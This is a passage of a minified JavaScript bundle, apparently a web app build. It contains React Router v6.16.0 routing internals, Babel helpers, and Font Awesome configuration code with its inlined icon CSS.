            value: this.props.routeContext
        }, b.createElement(Kd.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}

function M1(e) {
    let {
        routeContext: t,
        match: n,
        children: r
    } = e, i = b.useContext(A1);
    return i && i.static && i.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (i.staticContext._deepestRenderedBoundaryId = n.route.id), b.createElement(Pa.Provider, {
        value: t
    }, r)
}

function D1(e, t, n) {
    var r;
    if (t === void 0 && (t = []), n === void 0 && (n = null), e == null) {
        var i;
        if ((i = n) != null && i.errors) e = n.matches;
        else return null
    }
    let a = e,
        l = (r = n) == null ? void 0 : r.errors;
    if (l != null) {
        let o = a.findIndex(s => s.route.id && (l == null ? void 0 : l[s.route.id]));
        o >= 0 || Ee(!1), a = a.slice(0, Math.min(a.length, o + 1))
    }
    return a.reduceRight((o, s, u) => {
        let f = s.route.id ? l == null ? void 0 : l[s.route.id] : null,
            m = null;
        n && (m = s.route.errorElement || L1);
        let v = t.concat(a.slice(0, u + 1)),
            g = () => {
                let w;
                return f ? w = m : s.route.Component ? w = b.createElement(s.route.Component, null) : s.route.element ? w = s.route.element : w = o, b.createElement(M1, {
                    match: s,
                    routeContext: {
                        outlet: o,
                        matches: v,
                        isDataRoute: n != null
                    },
                    children: w
                })
            };
        return n && (s.route.ErrorBoundary || s.route.errorElement || u === 0) ? b.createElement(R1, {
            location: n.location,
            revalidation: n.revalidation,
            component: m,
            error: f,
            children: g(),
            routeContext: {
                outlet: null,
                matches: v,
                isDataRoute: !0
            }
        }) : g()
    }, null)
}
var lo = function(e) {
    return e.UseBlocker = "useBlocker", e.UseLoaderData = "useLoaderData", e.UseActionData = "useActionData", e.UseRouteError = "useRouteError", e.UseNavigation = "useNavigation", e.UseRouteLoaderData = "useRouteLoaderData", e.UseMatches = "useMatches", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e.UseRouteId = "useRouteId", e
}(lo || {});

function F1(e) {
    let t = b.useContext(I1);
    return t || Ee(!1), t
}

function _1(e) {
    let t = b.useContext(Pa);
    return t || Ee(!1), t
}

function U1(e) {
    let t = _1(),
        n = t.matches[t.matches.length - 1];
    return n.route.id || Ee(!1), n.route.id
}

function B1() {
    var e;
    let t = b.useContext(Kd),
        n = F1(lo.UseRouteError),
        r = U1(lo.UseRouteError);
    return t || ((e = n.errors) == null ? void 0 : e[r])
}

function Gd(e) {
    Ee(!1)
}

function H1(e) {
    let {
        basename: t = "/",
        children: n = null,
        location: r,
        navigationType: i = xt.Pop,
        navigator: a,
        static: l = !1
    } = e;
    ys() && Ee(!1);
    let o = t.replace(/^\/*/, "/"),
        s = b.useMemo(() => ({
            basename: o,
            navigator: a,
            static: l
        }), [o, a, l]);
    typeof r == "string" && (r = Ca(r));
    let {
        pathname: u = "/",
        search: f = "",
        hash: m = "",
        state: v = null,
        key: g = "default"
    } = r, w = b.useMemo(() => {
        let k = Wd(u, o);
        return k == null ? null : {
            location: {
                pathname: k,
                search: f,
                hash: m,
                state: v,
                key: g
            },
            navigationType: i
        }
    }, [o, u, f, m, v, g, i]);
    return w == null ? null : b.createElement(Yd.Provider, {
        value: s
    }, b.createElement(Na.Provider, {
        children: n,
        value: w
    }))
}

function V1(e) {
    let {
        children: t,
        location: n
    } = e;
    return b1(oo(t), n)
}
new Promise(() => {});

function oo(e, t) {
    t === void 0 && (t = []);
    let n = [];
    return b.Children.forEach(e, (r, i) => {
        if (!b.isValidElement(r)) return;
        let a = [...t, i];
        if (r.type === b.Fragment) {
            n.push.apply(n, oo(r.props.children, a));
            return
        }
        r.type !== Gd && Ee(!1), !r.props.index || !r.props.children || Ee(!1);
        let l = {
            id: r.props.id || a.join("-"),
            caseSensitive: r.props.caseSensitive,
            element: r.props.element,
            Component: r.props.Component,
            index: r.props.index,
            path: r.props.path,
            loader: r.props.loader,
            action: r.props.action,
            errorElement: r.props.errorElement,
            ErrorBoundary: r.props.ErrorBoundary,
            hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
            shouldRevalidate: r.props.shouldRevalidate,
            handle: r.props.handle,
            lazy: r.props.lazy
        };
        r.props.children && (l.children = oo(r.props.children, a)), n.push(l)
    }), n
}
/**
 * React Router DOM v6.16.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
const W1 = "startTransition",
    Ku = Xp[W1];

function Q1(e) {
    let {
        basename: t,
        children: n,
        future: r,
        window: i
    } = e, a = b.useRef();
    a.current == null && (a.current = o1({
        window: i,
        v5Compat: !0
    }));
    let l = a.current,
        [o, s] = b.useState({
            action: l.action,
            location: l.location
        }),
        {
            v7_startTransition: u
        } = r || {},
        f = b.useCallback(m => {
            u && Ku ? Ku(() => s(m)) : s(m)
        }, [s, u]);
    return b.useLayoutEffect(() => l.listen(f), [l, f]), b.createElement(H1, {
        basename: t,
        children: n,
        location: o.location,
        navigationType: o.action,
        navigator: l
    })
}
var Gu;
(function(e) {
    e.UseScrollRestoration = "useScrollRestoration", e.UseSubmit = "useSubmit", e.UseSubmitFetcher = "useSubmitFetcher", e.UseFetcher = "useFetcher"
})(Gu || (Gu = {}));
var Zu;
(function(e) {
    e.UseFetchers = "useFetchers", e.UseScrollRestoration = "useScrollRestoration"
})(Zu || (Zu = {}));

function Xu(e, t) {
    var n = Object.keys(e);
    if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        t && (r = r.filter(function(i) {
            return Object.getOwnPropertyDescriptor(e, i).enumerable
        })), n.push.apply(n, r)
    }
    return n
}

function C(e) {
    for (var t = 1; t < arguments.length; t++) {
        var n = arguments[t] != null ? arguments[t] : {};
        t % 2 ? Xu(Object(n), !0).forEach(function(r) {
            ne(e, r, n[r])
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : Xu(Object(n)).forEach(function(r) {
            Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(n, r))
        })
    }
    return e
}

function ra(e) {
    "@babel/helpers - typeof";
    return ra = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(t) {
        return typeof t
    } : function(t) {
        return t && typeof Symbol == "function" && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
    }, ra(e)
}

function Y1(e, t) {
    if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
}

function Ju(e, t) {
    for (var n = 0; n < t.length; n++) {
        var r = t[n];
        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
    }
}

function K1(e, t, n) {
    return t && Ju(e.prototype, t), n && Ju(e, n), Object.defineProperty(e, "prototype", {
        writable: !1
    }), e
}

function ne(e, t, n) {
    return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : e[t] = n, e
}

function ws(e, t) {
    return Z1(e) || J1(e, t) || Zd(e, t) || $1()
}

function Br(e) {
    return G1(e) || X1(e) || Zd(e) || q1()
}

function G1(e) {
    if (Array.isArray(e)) return so(e)
}

function Z1(e) {
    if (Array.isArray(e)) return e
}

function X1(e) {
    if (typeof Symbol < "u" && e[Symbol.iterator] != null || e["@@iterator"] != null) return Array.from(e)
}

function J1(e, t) {
    var n = e == null ? null : typeof Symbol < "u" && e[Symbol.iterator] || e["@@iterator"];
    if (n != null) {
        var r = [],
            i = !0,
            a = !1,
            l, o;
        try {
            for (n = n.call(e); !(i = (l = n.next()).done) && (r.push(l.value), !(t && r.length === t)); i = !0);
        } catch (s) {
            a = !0, o = s
        } finally {
            try {
                !i && n.return != null && n.return()
            } finally {
                if (a) throw o
            }
        }
        return r
    }
}

function Zd(e, t) {
    if (e) {
        if (typeof e == "string") return so(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        if (n === "Object" && e.constructor && (n = e.constructor.name), n === "Map" || n === "Set") return Array.from(e);
        if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return so(e, t)
    }
}

function so(e, t) {
    (t == null || t > e.length) && (t = e.length);
    for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
    return r
}

function q1() {
    throw new TypeError(`Invalid attempt to spread non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
}

function $1() {
    throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
}
var qu = function() {},
    ks = {},
    Xd = {},
    Jd = null,
    qd = {
        mark: qu,
        measure: qu
    };
try {
    typeof window < "u" && (ks = window), typeof document < "u" && (Xd = document), typeof MutationObserver < "u" && (Jd = MutationObserver), typeof performance < "u" && (qd = performance)
} catch {}
var ev = ks.navigator || {},
    $u = ev.userAgent,
    ec = $u === void 0 ? "" : $u,
    Tt = ks,
    W = Xd,
    tc = Jd,
    ui = qd;
Tt.document;
var dt = !!W.documentElement && !!W.head && typeof W.addEventListener == "function" && typeof W.createElement == "function",
    $d = ~ec.indexOf("MSIE") || ~ec.indexOf("Trident/"),
    ci, fi, di, pi, mi, st = "___FONT_AWESOME___",
    uo = 16,
    ep = "fa",
    tp = "svg-inline--fa",
    en = "data-fa-i2svg",
    co = "data-fa-pseudo-element",
    tv = "data-fa-pseudo-element-pending",
    xs = "data-prefix",
    Ss = "data-icon",
    nc = "fontawesome-i2svg",
    nv = "async",
    rv = ["HTML", "HEAD", "STYLE", "SCRIPT"],
    np = function() {
        try {
            return !0
        } catch {
            return !1
        }
    }(),
    H = "classic",
    X = "sharp",
    Es = [H, X];

function Hr(e) {
    return new Proxy(e, {
        get: function(n, r) {
            return r in n ? n[r] : n[H]
        }
    })
}
var Or = Hr((ci = {}, ne(ci, H, {
        fa: "solid",
        fas: "solid",
        "fa-solid": "solid",
        far: "regular",
        "fa-regular": "regular",
        fal: "light",
        "fa-light": "light",
        fat: "thin",
        "fa-thin": "thin",
        fad: "duotone",
        "fa-duotone": "duotone",
        fab: "brands",
        "fa-brands": "brands",
        fak: "kit",
        fakd: "kit",
        "fa-kit": "kit",
        "fa-kit-duotone": "kit"
    }), ne(ci, X, {
        fa: "solid",
        fass: "solid",
        "fa-solid": "solid",
        fasr: "regular",
        "fa-regular": "regular",
        fasl: "light",
        "fa-light": "light",
        fast: "thin",
        "fa-thin": "thin"
    }), ci)),
    br = Hr((fi = {}, ne(fi, H, {
        solid: "fas",
        regular: "far",
        light: "fal",
        thin: "fat",
        duotone: "fad",
        brands: "fab",
        kit: "fak"
    }), ne(fi, X, {
        solid: "fass",
        regular: "fasr",
        light: "fasl",
        thin: "fast"
    }), fi)),
    Tr = Hr((di = {}, ne(di, H, {
        fab: "fa-brands",
        fad: "fa-duotone",
        fak: "fa-kit",
        fal: "fa-light",
        far: "fa-regular",
        fas: "fa-solid",
        fat: "fa-thin"
    }), ne(di, X, {
        fass: "fa-solid",
        fasr: "fa-regular",
        fasl: "fa-light",
        fast: "fa-thin"
    }), di)),
    iv = Hr((pi = {}, ne(pi, H, {
        "fa-brands": "fab",
        "fa-duotone": "fad",
        "fa-kit": "fak",
        "fa-light": "fal",
        "fa-regular": "far",
        "fa-solid": "fas",
        "fa-thin": "fat"
    }), ne(pi, X, {
        "fa-solid": "fass",
        "fa-regular": "fasr",
        "fa-light": "fasl",
        "fa-thin": "fast"
    }), pi)),
    av = /fa(s|r|l|t|d|b|k|ss|sr|sl|st)?[\-\ ]/,
    rp = "fa-layers-text",
    lv = /Font ?Awesome ?([56 ]*)(Solid|Regular|Light|Thin|Duotone|Brands|Free|Pro|Sharp|Kit)?.*/i,
    ov = Hr((mi = {}, ne(mi, H, {
        900: "fas",
        400: "far",
        normal: "far",
        300: "fal",
        100: "fat"
    }), ne(mi, X, {
        900: "fass",
        400: "fasr",
        300: "fasl",
        100: "fast"
    }), mi)),
    ip = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
    sv = ip.concat([11, 12, 13, 14, 15, 16, 17, 18, 19, 20]),
    uv = ["class", "data-prefix", "data-icon", "data-fa-transform", "data-fa-mask"],
    Qt = {
        GROUP: "duotone-group",
        SWAP_OPACITY: "swap-opacity",
        PRIMARY: "primary",
        SECONDARY: "secondary"
    },
    zr = new Set;
Object.keys(br[H]).map(zr.add.bind(zr));
Object.keys(br[X]).map(zr.add.bind(zr));
var cv = [].concat(Es, Br(zr), ["2xs", "xs", "sm", "lg", "xl", "2xl", "beat", "border", "fade", "beat-fade", "bounce", "flip-both", "flip-horizontal", "flip-vertical", "flip", "fw", "inverse", "layers-counter", "layers-text", "layers", "li", "pull-left", "pull-right", "pulse", "rotate-180", "rotate-270", "rotate-90", "rotate-by", "shake", "spin-pulse", "spin-reverse", "spin", "stack-1x", "stack-2x", "stack", "ul", Qt.GROUP, Qt.SWAP_OPACITY, Qt.PRIMARY, Qt.SECONDARY]).concat(ip.map(function(e) {
        return "".concat(e, "x")
    })).concat(sv.map(function(e) {
        return "w-".concat(e)
    })),
    fr = Tt.FontAwesomeConfig || {};

function fv(e) {
    var t = W.querySelector("script[" + e + "]");
    if (t) return t.getAttribute(e)
}

function dv(e) {
    return e === "" ? !0 : e === "false" ? !1 : e === "true" ? !0 : e
}
if (W && typeof W.querySelector == "function") {
    var pv = [
        ["data-family-prefix", "familyPrefix"],
        ["data-css-prefix", "cssPrefix"],
        ["data-family-default", "familyDefault"],
        ["data-style-default", "styleDefault"],
        ["data-replacement-class", "replacementClass"],
        ["data-auto-replace-svg", "autoReplaceSvg"],
        ["data-auto-add-css", "autoAddCss"],
        ["data-auto-a11y", "autoA11y"],
        ["data-search-pseudo-elements", "searchPseudoElements"],
        ["data-observe-mutations", "observeMutations"],
        ["data-mutate-approach", "mutateApproach"],
        ["data-keep-original-source", "keepOriginalSource"],
        ["data-measure-performance", "measurePerformance"],
        ["data-show-missing-icons", "showMissingIcons"]
    ];
    pv.forEach(function(e) {
        var t = ws(e, 2),
            n = t[0],
            r = t[1],
            i = dv(fv(n));
        i != null && (fr[r] = i)
    })
}
var ap = {
    styleDefault: "solid",
    familyDefault: "classic",
    cssPrefix: ep,
    replacementClass: tp,
    autoReplaceSvg: !0,
    autoAddCss: !0,
    autoA11y: !0,
    searchPseudoElements: !1,
    observeMutations: !0,
    mutateApproach: "async",
    keepOriginalSource: !0,
    measurePerformance: !1,
    showMissingIcons: !0
};
fr.familyPrefix && (fr.cssPrefix = fr.familyPrefix);
var Mn = C(C({}, ap), fr);
Mn.autoReplaceSvg || (Mn.observeMutations = !1);
var I = {};
Object.keys(ap).forEach(function(e) {
    Object.defineProperty(I, e, {
        enumerable: !0,
        set: function(n) {
            Mn[e] = n, dr.forEach(function(r) {
                return r(I)
            })
        },
        get: function() {
            return Mn[e]
        }
    })
});
Object.defineProperty(I, "familyPrefix", {
    enumerable: !0,
    set: function(t) {
        Mn.cssPrefix = t, dr.forEach(function(n) {
            return n(I)
        })
    },
    get: function() {
        return Mn.cssPrefix
    }
});
Tt.FontAwesomeConfig = I;
var dr = [];

function mv(e) {
    return dr.push(e),
        function() {
            dr.splice(dr.indexOf(e), 1)
        }
}
var mt = uo,
    Xe = {
        size: 16,
        x: 0,
        y: 0,
        rotate: 0,
        flipX: !1,
        flipY: !1
    };

function hv(e) {
    if (!(!e || !dt)) {
        var t = W.createElement("style");
        t.setAttribute("type", "text/css"), t.innerHTML = e;
        for (var n = W.head.childNodes, r = null, i = n.length - 1; i > -1; i--) {
            var a = n[i],
                l = (a.tagName || "").toUpperCase();
            ["STYLE", "LINK"].indexOf(l) > -1 && (r = a)
        }
        return W.head.insertBefore(t, r), e
    }
}
var vv = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

function Lr() {
    for (var e = 12, t = ""; e-- > 0;) t += vv[Math.random() * 62 | 0];
    return t
}

function Un(e) {
    for (var t = [], n = (e || []).length >>> 0; n--;) t[n] = e[n];
    return t
}

function Cs(e) {
    return e.classList ? Un(e.classList) : (e.getAttribute("class") || "").split(" ").filter(function(t) {
        return t
    })
}

function lp(e) {
    return "".concat(e).replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/'/g, "&#39;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
}

function gv(e) {
    return Object.keys(e || {}).reduce(function(t, n) {
        return t + "".concat(n, '="').concat(lp(e[n]), '" ')
    }, "").trim()
}

function ja(e) {
    return Object.keys(e || {}).reduce(function(t, n) {
        return t + "".concat(n, ": ").concat(e[n].trim(), ";")
    }, "")
}

function Ns(e) {
    return e.size !== Xe.size || e.x !== Xe.x || e.y !== Xe.y || e.rotate !== Xe.rotate || e.flipX || e.flipY
}

function yv(e) {
    var t = e.transform,
        n = e.containerWidth,
        r = e.iconWidth,
        i = {
            transform: "translate(".concat(n / 2, " 256)")
        },
        a = "translate(".concat(t.x * 32, ", ").concat(t.y * 32, ") "),
        l = "scale(".concat(t.size / 16 * (t.flipX ? -1 : 1), ", ").concat(t.size / 16 * (t.flipY ? -1 : 1), ") "),
        o = "rotate(".concat(t.rotate, " 0 0)"),
        s = {
            transform: "".concat(a, " ").concat(l, " ").concat(o)
        },
        u = {
            transform: "translate(".concat(r / 2 * -1, " -256)")
        };
    return {
        outer: i,
        inner: s,
        path: u
    }
}

function wv(e) {
    var t = e.transform,
        n = e.width,
        r = n === void 0 ? uo : n,
        i = e.height,
        a = i === void 0 ? uo : i,
        l = e.startCentered,
        o = l === void 0 ? !1 : l,
        s = "";
    return o && $d ? s += "translate(".concat(t.x / mt - r / 2, "em, ").concat(t.y / mt - a / 2, "em) ") : o ? s += "translate(calc(-50% + ".concat(t.x / mt, "em), calc(-50% + ").concat(t.y / mt, "em)) ") : s += "translate(".concat(t.x / mt, "em, ").concat(t.y / mt, "em) "), s += "scale(".concat(t.size / mt * (t.flipX ? -1 : 1), ", ").concat(t.size / mt * (t.flipY ? -1 : 1), ") "), s += "rotate(".concat(t.rotate, "deg) "), s
}
var kv = `:root, :host {
  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
}

svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
  overflow: visible;
  box-sizing: content-box;
}

.svg-inline--fa {
  display: var(--fa-display, inline-block);
  height: 1em;
  overflow: visible;
  vertical-align: -0.125em;
}
.svg-inline--fa.fa-2xs {
  vertical-align: 0.1em;
}
.svg-inline--fa.fa-xs {
  vertical-align: 0em;
}
.svg-inline--fa.fa-sm {
  vertical-align: -0.0714285705em;
}
.svg-inline--fa.fa-lg {
  vertical-align: -0.2em;
}
.svg-inline--fa.fa-xl {
  vertical-align: -0.25em;
}
.svg-inline--fa.fa-2xl {
  vertical-align: -0.3125em;
}
.svg-inline--fa.fa-pull-left {
  margin-right: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-pull-right {
  margin-left: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-li {
  width: var(--fa-li-width, 2em);
  top: 0.25em;
}
.svg-inline--fa.fa-fw {
  width: var(--fa-fw-width, 1.25em);
}

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
}

.fa-layers-counter, .fa-layers-text {
  display: inline-block;
  position: absolute;
  text-align: center;
}

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -0.125em;
  width: 1em;
}
.fa-layers svg.svg-inline--fa {
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-text {
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-counter {
  background-color: var(--fa-counter-background-color, #ff253a);
  border-radius: var(--fa-counter-border-radius, 1em);
  box-sizing: border-box;
  color: var(--fa-inverse, #fff);
  line-height: var(--fa-counter-line-height, 1);
  max-width: var(--fa-counter-max-width, 5em);
  min-width: var(--fa-counter-min-width, 1.5em);
  overflow: hidden;
  padding: var(--fa-counter-padding, 0.25em 0.5em);
  right: var(--fa-right, 0);
  text-overflow: ellipsis;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-counter-scale, 0.25));
          transform: scale(var(--fa-counter-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-bottom-right {
  bottom: var(--fa-bottom, 0);
  right: var(--fa-right, 0);
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom right;
          transform-origin: bottom right;
}

.fa-layers-bottom-left {
  bottom: var(--fa-bottom, 0);
  left: var(--fa-left, 0);
  right: auto;
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom left;
          transform-origin: bottom left;
}

.fa-layers-top-right {
  top: var(--fa-top, 0);
  right: var(--fa-right, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-top-left {
  left: var(--fa-left, 0);
  right: auto;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top left;
          transform-origin: top left;
}

.fa-1x {
  font-size: 1em;
}

.fa-2x {
  font-size: 2em;
}

.fa-3x {
  font-size: 3em;
}

.fa-4x {
  font-size: 4em;
}

.fa-5x {
  font-size: 5em;
}

.fa-6x {
  font-size: 6em;
}

.fa-7x {
  font-size: 7em;
}

.fa-8x {
  font-size: 8em;
}

.fa-9x {
  font-size: 9em;
}

.fa-10x {
  font-size: 10em;
}

.fa-2xs {
  font-size: 0.625em;
  line-height: 0.1em;
  vertical-align: 0.225em;
}

.fa-xs {
  font-size: 0.75em;
  line-height: 0.0833333337em;
  vertical-align: 0.125em;
}

.fa-sm {
  font-size: 0.875em;
  line-height: 0.0714285718em;
  vertical-align: 0.0535714295em;
}

.fa-lg {
  font-size: 1.25em;
  line-height: 0.05em;
  vertical-align: -0.075em;
}

.fa-xl {
  font-size: 1.5em;
  line-height: 0.0416666682em;
  vertical-align: -0.125em;
}

.fa-2xl {
  font-size: 2em;
  line-height: 0.03125em;
  vertical-align: -0.1875em;
}

.fa-fw {
  text-align: center;
  width: 1.25em;
}

.fa-ul {
  list-style-type: none;
  margin-left: var(--fa-li-margin, 2.5em);
  padding-left: 0;
}
.fa-ul > li {
  position: relative;
}

.fa-li {
  left: calc(var(--fa-li-width, 2em) * -1);
  position: absolute;
  text-align: center;
  width: var(--fa-li-width, 2em);
  line-height: inherit;
}

.fa-border {
  border-color: var(--fa-border-color, #eee);
  border-radius: var(--fa-border-radius, 0.1em);
  border-style: var(--fa-border-style, solid);
  border-width: var(--fa-border-width, 0.08em);
  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
}

.fa-pull-left {
  float: left;
  margin-right: var(--fa-pull-margin, 0.3em);
}

.fa-pull-right {
  float: right;
  margin-left: var(--fa-pull-margin, 0.3em);
}

.fa-beat {
  -webkit-animation-name: fa-beat;
          animation-name: fa-beat;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-bounce {
  -webkit-animation-name: fa-bounce;
          animation-name: fa-bounce;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
}

.fa-fade {
  -webkit-animation-name: fa-fade;
          animation-name: fa-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-beat-fade {
  -webkit-animation-name: fa-beat-fade;
          animation-name: fa-beat-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-flip {
  -webkit-animation-name: fa-flip;
          animation-name: fa-flip;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-shake {
  -webkit-animation-name: fa-shake;
          animation-name: fa-shake;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 2s);
          animation-duration: var(--fa-animation-duration, 2s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin-reverse {
  --fa-animation-direction: reverse;
}

.fa-pulse,
.fa-spin-pulse {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
          animation-timing-function: var(--fa-animation-timing, steps(8));
}

@media (prefers-reduced-motion: reduce) {
  .fa-beat,
.fa-bounce,
.fa-fade,
.fa-beat-fade,
.fa-flip,
.fa-pulse,
.fa-shake,
.fa-spin,
.fa-spin-pulse {
    -webkit-animation-delay: -1ms;
            animation-delay: -1ms;
    -webkit-animation-duration: 1ms;
            animation-duration: 1ms;
    -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
    -webkit-transition-delay: 0s;
            transition-delay: 0s;
